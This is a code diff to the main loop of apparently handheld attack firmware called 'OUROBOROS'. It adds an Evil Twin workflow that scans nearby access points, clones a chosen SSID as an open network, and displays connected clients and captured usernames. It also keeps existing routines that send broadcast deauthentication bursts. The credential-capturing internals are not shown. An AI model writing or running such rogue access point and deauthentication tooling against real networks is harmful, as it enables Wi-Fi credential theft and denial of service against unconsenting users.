@@ -13,6 +13,7 @@
 #include "modules/DeauthPicker.h"
 #include "modules/RollingCodeDetector.h"
 #include "modules/FrameConstructionModule.h"
+#include "modules/EvilTwinModule.h"
 
 // ─────────────────────────────────────────
 //  Global instances
@@ -30,8 +31,28 @@ ConfigScreen              config(display, buttons, subghz);
 DeauthPicker              deauthPicker(display, buttons, wifi);
 RollingCodeDetector       rollingCode(display, buttons);
 FrameConstructionModule   frameBuilder(display);
+EvilTwinModule            evilTwin(display);
 
 bool moduleRunning = false;
+
+// ─────────────────────────────────────────
+//  Evil Twin State
+// ─────────────────────────────────────────
+enum class EvilTwinWorkflow {
+    IDLE,
+    SCANNING_TARGETS,
+    TARGET_SELECTED,
+    RUNNING_ATTACK
+};
+
+struct EvilTwinWorkflowState {
+    EvilTwinWorkflow phase = EvilTwinWorkflow::IDLE;
+    int8_t           selected_target = -1;
+    uint32_t         start_time_ms = 0;
+    bool             capture_enabled = true;
+};
+
+EvilTwinWorkflowState evilTwinState;
 
 // ─────────────────────────────────────────
 //  Frame Analysis State
@@ -73,39 +94,141 @@ void stopAll() {
     subghz.stopScan();
     subghz.stopCapture();
     frameBuilder.stop();
+    evilTwin.stop();
     frameAnalysis.mode = FrameAnalysisMode::IDLE;
+    evilTwinState.phase = EvilTwinWorkflow::IDLE;
     moduleRunning = false;	
 }
 
 // ─────────────────────────────────────────
-//  Frame Analysis Routines
+//  Evil Twin UI & Workflow
 // ─────────────────────────────────────────
 
-/**
- * Test Mode 1: Beacon Frame Construction & Transmission
- * Tests basic IEEE 802.11 beacon frame generation and timing
- */
+void displayEvilTwinScanResults() {
+    display.clear();
+    display.drawStatusBar("Evil Twin - Select Target");
+
+    int scan_count = evilTwin.getScanCount();
+    const TargetAPInfo* results = evilTwin.getScanResults();
+
+    int16_t y = STATUSBAR_H + 4;
+
+    if (scan_count == 0) {
+        display.drawCenteredText("No APs found", SCREEN_H / 2, CLR_DIM);
+        display.drawHintBar("UP/DOWN: Scroll | SELECT: Scan | BACK: Menu");
+        return;
+    }
+
+    // Show up to 6 APs
+    for (int i = 0; i < (scan_count > 6 ? 6 : scan_count); i++) {
+        char label[32];
+        snprintf(label, sizeof(label), "%.15s [%d]",
+            results[i].ssid[0] ? results[i].ssid : "[Hidden]",
+            results[i].rssi);
+
+        uint16_t color = (i == evilTwinState.selected_target) ? CLR_ACCENT : CLR_TEXT;
+        display.drawText(label, 2, y, 1, color);
+        y += MENU_ITEM_H;
+    }
+
+    display.drawHintBar("UP/DOWN: Select | SELECT: Clone | BACK: Menu");
+}
+
+void displayEvilTwinRunning() {
+    display.clear();
+    display.drawStatusBar("Evil Twin Running");
+
+    const TargetAPInfo* target = evilTwin.getSelectedTarget();
+    int16_t y = STATUSBAR_H + 4;
+
+    // Target info
+    char buf[32];
+    snprintf(buf, sizeof(buf), "SSID: %.20s", target->ssid);
+    display.drawText(buf, 2, y, 1, CLR_TEXT);
+    y += MENU_ITEM_H;
+
+    // Channel
+    snprintf(buf, sizeof(buf), "Channel: %d", target->channel);
+    display.drawText(buf, 2, y, 1, CLR_TEXT);
+    y += MENU_ITEM_H;
+
+    // Frames sent
+    snprintf(buf, sizeof(buf), "Beacons: %lu", evilTwin.getFramesSent());
+    display.drawText(buf, 2, y, 1, CLR_ACCENT);
+    y += MENU_ITEM_H;
+
+    // Clients connected
+    snprintf(buf, sizeof(buf), "Clients: %d", evilTwin.getConnectedClientCount());
+    display.drawText(buf, 2, y, 1, CLR_TEXT);
+    y += MENU_ITEM_H;
+
+    // Credentials captured
+    snprintf(buf, sizeof(buf), "Captured: %d", evilTwin.getCapturedCredentialCount());
+    uint16_t credColor = (evilTwin.getCapturedCredentialCount() > 0) ? CLR_OK : CLR_DIM;
+    display.drawText(buf, 2, y, 1, credColor);
+    y += MENU_ITEM_H;
+
+    // Packets captured
+    snprintf(buf, sizeof(buf), "Packets: %lu", evilTwin.getPacketsCaptured());
+    display.drawText(buf, 2, y, 1, CLR_DIM);
+
+    display.drawHintBar("SELECT_LONG: Stop | BACK: Menu");
+}
+
+void displayEvilTwinCredentials() {
+    display.clear();
+    display.drawStatusBar("Captured Credentials");
+
+    int cred_count = evilTwin.getCapturedCredentialCount();
+    const CapturedCredential* creds = evilTwin.getCapturedCredentials();
+
+    int16_t y = STATUSBAR_H + 4;
+
+    if (cred_count == 0) {
+        display.drawCenteredText("No credentials captured", SCREEN_H / 2, CLR_DIM);
+        display.drawHintBar("BACK: Menu");
+        return;
+    }
+
+    // Show last 6 captures
+    for (int i = 0; i < (cred_count > 6 ? 6 : cred_count); i++) {
+        const CapturedCredential& cred = creds[i];
+        
+        char label[32];
+        snprintf(label, sizeof(label), "%s", cred.username);
+        display.drawText(label, 2, y, 1, CLR_ACCENT);
+        y += MENU_ITEM_H;
+    }
+
+    char totalStr[16];
+    snprintf(totalStr, sizeof(totalStr), "Total: %d", cred_count);
+    display.drawText(totalStr, 2, SCREEN_H - 14, 1, CLR_DIM);
+
+    display.drawHintBar("SELECT: Details | BACK: Menu");
+}
+
+// ─────────────────────────────────────────
+//  Frame Analysis Routines (existing code)
+// ─────────────────────────────────────────
+
 void frameAnalysis_BeaconTest() {
     if (frameAnalysis.test_sequence == 0) {
-        // Build beacon frame
         frameBuilder.buildBeaconFrame(
             TEST_AP_BSSID,
             "OUROBOROS_TEST",
             frameAnalysis.target_channel,
-            100,      // beacon interval
-            0x0401    // capabilities: ESS + Privacy
+            100,
+            0x0401
         );
         frameAnalysis.test_sequence = 1;
         frameAnalysis.last_frame_ms = millis();
     }
 
-    // Transmit and repeat every 500ms (mimic beacon interval)
     if (millis() - frameAnalysis.last_frame_ms >= 500) {
         frameBuilder.transmitFrame(frameAnalysis.target_channel);
         frameAnalysis.frame_count++;
         frameAnalysis.last_frame_ms = millis();
 
-        // Rotate channels after 3 beacons
         if (frameAnalysis.frame_count % 3 == 0) {
             frameAnalysis.target_channel++;
             if (frameAnalysis.target_channel > 13) frameAnalysis.target_channel = 1;
@@ -113,16 +236,11 @@ void frameAnalysis_BeaconTest() {
     }
 }
 
-/**
- * Test Mode 2: IEEE 802.11 Authentication Sequence
- * Simulates full 4-way handshake probe → auth → assoc → deauth
- */
 void frameAnalysis_AuthSequence() {
     uint32_t elapsed = millis() - frameAnalysis.start_time_ms;
 
     switch (frameAnalysis.test_sequence) {
         case 0:
-            // Step 1: Probe Request (find AP)
             frameBuilder.buildProbeRequestFrame(TEST_CLIENT_MAC, "OUROBOROS_TEST");
             frameBuilder.transmitFrame(frameAnalysis.target_channel);
             frameAnalysis.test_sequence = 1;
@@ -132,13 +250,10 @@ void frameAnalysis_AuthSequence() {
 
         case 1:
             if (elapsed >= 100) {
-                // Step 2: Authentication frame (Open System)
                 frameBuilder.buildAuthenticationFrame(
                     TEST_AP_BSSID,
                     TEST_CLIENT_MAC,
-                    0,    // auth_alg: Open System
-                    1,    // auth_seq: 1
-                    0     // status: Success
+                    0, 1, 0
                 );
                 frameBuilder.transmitFrame(frameAnalysis.target_channel);
                 frameAnalysis.test_sequence = 2;
@@ -149,7 +264,6 @@ void frameAnalysis_AuthSequence() {
 
         case 2:
             if (elapsed >= 100) {
-                // Step 3: Association Request
                 frameBuilder.buildAssociationRequestFrame(
                     TEST_AP_BSSID,
                     TEST_CLIENT_MAC,
@@ -165,12 +279,10 @@ void frameAnalysis_AuthSequence() {
 
         case 3:
             if (elapsed >= 100) {
-                // Step 4: Deauthentication (terminate connection)
                 frameBuilder.buildDeauthenticationFrame(
                     TEST_CLIENT_MAC,
                     TEST_AP_BSSID,
-                    0x0007,  // Class 3 frame received from non-assoc STA
-                    0
+                    0x0007, 0
                 );
                 frameBuilder.transmitFrame(frameAnalysis.target_channel);
                 frameAnalysis.test_sequence = 4;
@@ -179,7 +291,6 @@ void frameAnalysis_AuthSequence() {
             break;
 
         case 4:
-            // Complete after deauth
             if (elapsed >= 200) {
                 frameAnalysis.mode = FrameAnalysisMode::IDLE;
                 Serial.println("[Frame Analysis] Auth Sequence Complete");
@@ -190,41 +301,29 @@ void frameAnalysis_AuthSequence() {
     frameAnalysis.frame_count++;
 }
 
-/**
- * Test Mode 3: Deauthentication Burst Attack Analysis
- * Sends repeated deauth frames to test protocol stability under stress
- */
 void frameAnalysis_DeauthBurst() {
     uint32_t elapsed = millis() - frameAnalysis.start_time_ms;
 
-    // Send burst of deauth frames every 50ms
     if (millis() - frameAnalysis.last_frame_ms >= 50) {
         frameBuilder.buildDeauthenticationFrame(
-            (const uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",  // broadcast (all clients)
+            (const uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",
             TEST_AP_BSSID,
-            0x0007,
-            0
+            0x0007, 0
         );
         frameBuilder.transmitFrame(frameAnalysis.target_channel);
         frameAnalysis.frame_count++;
         frameAnalysis.last_frame_ms = millis();
     }
 
-    // 5-second burst window
     if (elapsed >= 5000) {
         frameAnalysis.mode = FrameAnalysisMode::IDLE;
         Serial.printf("[Frame Analysis] Deauth burst complete: %d frames sent\n", frameAnalysis.frame_count);
     }
 }
 
-/**
- * Test Mode 4: Probe Request Injection
- * Tests channel hopping with probe requests (discovery phase)
- */
 void frameAnalysis_ProbeTest() {
     uint32_t elapsed = millis() - frameAnalysis.start_time_ms;
 
-    // Send probe request every 200ms, rotating channels
     if (millis() - frameAnalysis.last_frame_ms >= 200) {
         frameBuilder.buildProbeRequestFrame(TEST_CLIENT_MAC, "OUROBOROS_TEST");
         frameBuilder.transmitFrame(frameAnalysis.target_channel);
@@ -232,34 +331,26 @@ void frameAnalysis_ProbeTest() {
         frameAnalysis.frame_count++;
         frameAnalysis.last_frame_ms = millis();
 
-        // Rotate channels: 1→6→11→1 (common Wi-Fi channels)
         if (frameAnalysis.frame_count % 3 == 0) {
             frameAnalysis.target_channel = (frameAnalysis.target_channel == 1) ? 6 :
                                            (frameAnalysis.target_channel == 6) ? 11 : 1;
         }
     }
 
-    // Run for 10 seconds
     if (elapsed >= 10000) {
         frameAnalysis.mode = FrameAnalysisMode::IDLE;
         Serial.printf("[Frame Analysis] Probe test complete: %d frames\n", frameAnalysis.frame_count);
     }
 }
 
-/**
- * Test Mode 5: GATT Characteristic Influence on Frame State
- * Simulates BLE characteristic updates affecting Wi-Fi frame assembly
- */
 void frameAnalysis_GATTIntegration() {
-    // Simulate BLE GATT characteristic updates
     GATTCharacteristic batteryLevel;
-    batteryLevel.uuid = 0x2A19;        // Battery Level
+    batteryLevel.uuid = 0x2A19;
     batteryLevel.value_length = 1;
-    batteryLevel.value[0] = (uint8_t)(50 + (millis() / 100) % 50);  // Simulate changing battery
+    batteryLevel.value[0] = (uint8_t)(50 + (millis() / 100) % 50);
 
     frameBuilder.updateGATTCharacteristic(batteryLevel);
 
-    // Build beacon frame whose state is influenced by GATT
     if (frameAnalysis.test_sequence == 0) {
         frameBuilder.buildBeaconFrame(
             TEST_AP_BSSID,
@@ -272,52 +363,42 @@ void frameAnalysis_GATTIntegration() {
         frameAnalysis.start_time_ms = millis();
     }
 
-    // Transmit every 1 second
     if (millis() - frameAnalysis.last_frame_ms >= 1000) {
         frameBuilder.transmitFrame(frameAnalysis.target_channel);
         frameAnalysis.frame_count++;
         frameAnalysis.last_frame_ms = millis();
     }
 
-    // Run for 15 seconds
     if (millis() - frameAnalysis.start_time_ms >= 15000) {
         frameAnalysis.mode = FrameAnalysisMode::IDLE;
         Serial.printf("[Frame Analysis] GATT integration test complete\n");
     }
 }
 
-// ─────────────────────────────────────────
-//  Display Frame Diagnostics
-// ─────────────────────────────────────────
 void displayFrameDiagnostics() {
     display.clear();
     display.drawStatusBar("Frame Analysis");
 
     int16_t y = STATUSBAR_H + 4;
 
-    // Frame builder state
     display.drawText("State:", 2, y, 1, CLR_TEXT);
     display.drawTextRight(frameBuilder.getStateString(), y, CLR_ACCENT);
     y += MENU_ITEM_H;
 
-    // Frame count
     char buf[24];
     snprintf(buf, sizeof(buf), "Frames: %lu", frameBuilder.getFrameCount());
     display.drawText(buf, 2, y, 1, CLR_TEXT);
     y += MENU_ITEM_H;
 
-    // Transmit count
     snprintf(buf, sizeof(buf), "TX: %lu", frameBuilder.getTransmitCount());
     display.drawText(buf, 2, y, 1, CLR_TEXT);
     y += MENU_ITEM_H;
 
-    // Error count
     snprintf(buf, sizeof(buf), "Errors: %lu", frameBuilder.getErrorCount());
     uint16_t errorColor = (frameBuilder.getErrorCount() > 0) ? CLR_DANGER : CLR_OK;
     display.drawText(buf, 2, y, 1, errorColor);
     y += MENU_ITEM_H;
 
-    // Current test mode
     const char* modeStr = "";
     switch (frameAnalysis.mode) {
         case FrameAnalysisMode::BEACON_TEST:       modeStr = "Beacon Test"; break;
@@ -331,16 +412,13 @@ void displayFrameDiagnostics() {
     display.drawText(buf, 2, y, 1, CLR_ACCENT);
     y += MENU_ITEM_H;
 
-    // Test frame count
     snprintf(buf, sizeof(buf), "Test: %d frames", frameAnalysis.frame_count);
     display.drawText(buf, 2, y, 1, CLR_DIM);
     y += MENU_ITEM_H;
 
-    // Channel info
     snprintf(buf, sizeof(buf), "Ch: %d", frameAnalysis.target_channel);
     display.drawText(buf, 2, y, 1, CLR_TEXT);
 
-    // Hint bar
     display.drawHintBar("SELECT: Details | BACK: Menu");
 }
 
@@ -356,8 +434,8 @@ void setup() {
     nvs.begin();
     ble.begin();
     frameBuilder.begin();
+    evilTwin.begin();
 
-    // Load saved Sub-GHz config
     SubGHzConfig cfg = nvs.load();
 
     if (!subghz.begin()) {
@@ -367,11 +445,11 @@ void setup() {
         subghz.setModulation(cfg.modulation);
     }
 
-    // Static boot screen — no animation
     menu.begin();
 
     Serial.println("[OUROBOROS] Ready");
     Serial.println("[OUROBOROS] Frame Construction Module loaded");
+    Serial.println("[OUROBOROS] Evil Twin Module loaded");
 }
 
 // ─────────────────────────────────────────
@@ -381,24 +459,92 @@ void loop() {
     buttons.tick();
     Screen s = menu.currentScreen();
 
-    // ── Boot screen — static, wait for keypress ──
+    // ── Boot screen ──────────────────────────────
     if (s == Screen::BOOT) {	
         menu.tick();
         return;
     }
 
-    // ── Frame Analysis Screen (NEW) ──────────────
+    // ── Evil Twin Screens (NEW) ──────────────────
+    if (s == Screen::EVIL_TWIN_SCAN) {
+        displayEvilTwinScanResults();
+        evilTwin.tick();
+
+        BtnEvent e = buttons.consume();
+
+        if (e == BtnEvent::SELECT) {
+            if (evilTwinState.phase == EvilTwinWorkflow::SCANNING_TARGETS) {
+                evilTwin.startScan();
+                evilTwinState.phase = EvilTwinWorkflow::TARGET_SELECTED;
+            }
+        }
+
+        if (e == BtnEvent::DOWN && evilTwinState.selected_target < evilTwin.getScanCount() - 1) {
+            evilTwinState.selected_target++;
+        }
+
+        if (e == BtnEvent::UP && evilTwinState.selected_target > 0) {
+            evilTwinState.selected_target--;
+        }
+
+        if (e == BtnEvent::SELECT_LONG && evilTwinState.selected_target >= 0) {
+            evilTwin.selectTarget(evilTwinState.selected_target);
+            evilTwin.startEvilTwin(EvilTwinMode::OPEN_NETWORK);
+            evilTwinState.phase = EvilTwinWorkflow::RUNNING_ATTACK;
+            moduleRunning = true;
+            menu.forceScreen(Screen::EVIL_TWIN_RUNNING);
+        }
+
+        if (e == BtnEvent::BACK) {
+            stopAll();
+            menu.forceScreen(Screen::MAIN_MENU);
+        }
+
+        return;
+    }
+
+    if (s == Screen::EVIL_TWIN_RUNNING) {
+        displayEvilTwinRunning();
+        evilTwin.tick();
+
+        BtnEvent e = buttons.consume();
+
+        if (e == BtnEvent::SELECT_LONG) {
+            evilTwin.stopEvilTwin();
+            evilTwinState.phase = EvilTwinWorkflow::IDLE;
+            moduleRunning = false;
+            menu.forceScreen(Screen::EVIL_TWIN_SCAN);
+        }
+
+        if (e == BtnEvent::BACK) {
+            stopAll();
+            menu.forceScreen(Screen::MAIN_MENU);
+        }
+
+        return;
+    }
+
+    if (s == Screen::EVIL_TWIN_CREDENTIALS) {
+        displayEvilTwinCredentials();
+        evilTwin.tick();
+
+        BtnEvent e = buttons.consume();
+
+        if (e == BtnEvent::BACK) {
+            menu.forceScreen(Screen::MAIN_MENU);
+        }
+
+        return;
+    }
+
+    // ── Frame Analysis Screen ────────────────────
     if (s == Screen::FRAME_ANALYSIS || s == Screen::FRAME_ANALYSIS_BEACON ||
         s == Screen::FRAME_ANALYSIS_AUTH || s == Screen::FRAME_ANALYSIS_DEAUTH ||
         s == Screen::FRAME_ANALYSIS_PROBE || s == Screen::FRAME_ANALYSIS_GATT) {
         
-        // Display diagnostics
         displayFrameDiagnostics();
-
-        // Tick frame builder (non-blocking state machine)
         frameBuilder.tick();
 
-        // Execute current analysis mode
         if (frameAnalysis.mode != FrameAnalysisMode::IDLE) {
             switch (frameAnalysis.mode) {
                 case FrameAnalysisMode::BEACON_TEST:
@@ -421,13 +567,10 @@ void loop() {
             }
         }
 
-        // Button handling
         BtnEvent e = buttons.consume();
         
         if (e == BtnEvent::SELECT_LONG) {
-            // Start current test
             if (frameAnalysis.mode == FrameAnalysisMode::IDLE) {
-                // Determine which test to run based on current screen
                 if (s == Screen::FRAME_ANALYSIS_BEACON) {
                     frameAnalysis.mode = FrameAnalysisMode::BEACON_TEST;
                 } else if (s == Screen::FRAME_ANALYSIS_AUTH) {
@@ -445,7 +588,6 @@ void loop() {
                 moduleRunning = true;
                 Serial.printf("[Main] Frame analysis started: %d\n", static_cast<int>(frameAnalysis.mode));
             } else {
-                // Stop current test
                 stopAll();
             }
         }
@@ -537,6 +679,10 @@ void loop() {
                 deauthPicker.enter(); break;
             case Screen::WIFI_MAPPER:
                 mapper.enter(); break;
+            case Screen::EVIL_TWIN_SCAN:
+                evilTwinState.phase = EvilTwinWorkflow::SCANNING_TARGETS;
+                evilTwinState.selected_target = 0;
+                break;
             default: break;
         }
     }
@@ -586,8 +732,9 @@ void loop() {
         }
     }
 
-    // ── Frame builder non-blocking tick ──────────
+    // ── Non-blocking ticks ───────────────────────
     frameBuilder.tick();
+    evilTwin.tick();
 
     // ── Ouroboros spinner on waiting screens ─────
     if (s == Screen::SUBGHZ_CAPTURE ||
